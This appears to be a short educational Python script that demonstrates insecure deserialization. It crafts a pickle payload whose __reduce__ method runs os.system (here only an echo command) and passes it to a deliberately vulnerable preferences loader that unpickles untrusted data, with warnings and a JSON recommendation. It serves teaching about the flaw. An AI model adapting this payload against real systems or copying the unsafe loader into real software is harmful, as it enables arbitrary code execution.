import pickle
import base64
import os

# IMPORTANT: This code demonstrates a security vulnerability.
# It is for educational purposes only and should NEVER be used in real applications.

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('echo SYSTEM COMPROMISED',))

# Create the malicious payload
malicious_payload = base64.b64encode(pickle.dumps(MaliciousPayload())).decode('utf-8')

def vulnerable_load_preferences(user_id, encoded_data):
    serialized_data = base64.b64decode(encoded_data)
    # VULNERABILITY: Unpickling untrusted data
    preferences = pickle.loads(serialized_data)
    print(f"Loaded preferences for user {user_id}")
    return preferences

print("Simulating a vulnerability - DO NOT USE THIS CODE IN REAL APPLICATIONS")
print("Vulnerable function attempting to load malicious data:")
try:
    result = vulnerable_load_preferences("hacker", malicious_payload)
except Exception as e:
    print(f"An error occurred: {e}")

print("\nIn a real-world scenario, this could lead to arbitrary code execution.")
print("Always use safe serialization methods like JSON for untrusted data.")
print("Never use pickle with untrusted data in real applications.")